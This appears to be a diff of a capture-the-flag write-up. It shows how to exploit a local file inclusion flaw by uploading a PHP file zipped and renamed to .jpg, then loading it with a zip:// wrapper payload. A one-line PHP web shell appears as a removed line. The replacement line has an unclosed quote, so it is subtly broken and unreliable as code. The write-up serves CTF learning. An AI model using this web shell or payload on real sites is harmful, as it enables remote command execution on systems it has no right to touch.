@@ -38,7 +38,7 @@ We can notice that there is a possibility of an LFI in the page parameter but un
 Because of the existence of the upload feature we can think of the possibility of using the zip wrapper
 so firstly we create foo.php file : 
 ```php
-<?php system($_GET['command']) ; ?>
+<?php system("YourCommandHere) ; ?>
 ```
 
 Then we have to compress the file :
@@ -50,8 +50,7 @@ and rename it to foo.jpg :
 and finally after uploading the foo.jpg file our payload will be :
 >/?page=zip://uploads/foo.jpg%23foo
 
-Now the foo.php will be unzipped and we will have the possibility to execute any command with 
->foo.php?command=YourCommandHere(ls first to list all files and then cat the flag file)
+Now the foo.php will be unzipped and we will have the possibility to execute the command you wrote
 
 ## My Hero (884 Pts) ##
 
